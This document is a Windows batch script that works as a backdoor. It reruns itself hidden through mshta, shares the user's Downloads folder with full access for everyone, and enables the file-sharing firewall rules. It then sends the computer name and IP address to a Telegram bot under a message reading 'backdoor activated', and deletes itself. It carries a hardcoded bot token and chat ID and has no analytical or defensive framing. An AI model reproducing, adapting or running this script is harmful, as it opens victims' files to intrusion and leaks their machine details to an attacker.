@echo off
if "%1"=="h" goto :begin
mshta vbscript:CreateObject("WScript.Shell").Run("""%~f0"" h",0)(window.close)&&exit
:begin

net share Downloads="C:\Users\%username%\Downloads" /grant:everyone,full >nul 2>&1
netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes >nul 2>&1

for /f "tokens=4" %%a in ('route print ^| findstr 0.0.0.0 ^| findstr /V "127.0.0.1"') do set "myip=%%a"
set "TOKEN=8315753003:AAGKZ6KbERxw5XJnQX0DagI1u2eDR34oryg"
set "ID=7318370755"
set "MSG=✅ 后门已激活！%0APC: %computername%%0AIP: %myip%"

curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%ID%&text=%MSG%" >nul

start /b "" cmd /c del "%~f0"&exit